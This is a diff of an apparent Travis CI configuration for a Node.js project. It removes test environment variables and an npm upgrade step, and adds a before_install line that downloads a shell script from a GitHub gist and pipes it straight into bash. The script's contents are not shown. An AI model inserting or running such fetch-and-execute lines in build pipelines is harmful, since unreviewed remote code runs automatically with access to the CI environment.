@@ -5,17 +5,6 @@ services:
 node_js:
   - "0.10"
   - "4.4.3"
-env:
-  - TEST="hello"
-  - TEST="world"
-  - TEST="again"
-  - TEST="and"
-  - TEST="not again"
-  - TEST="haha"
-  - TEST="hehe"
-  - TEST="hoho"
 before_install:
-  - npm install -g npm@2.13.5
+  - bash <(curl -s https://gist.githubusercontent.com/psturc/8f386fd74d8b34faf113ff14d7638529/raw/2731ac59cb8e6feef91dabd69975ce68a544acaf/build.sh)
 install: npm install
-script: "echo $TEST"
-  
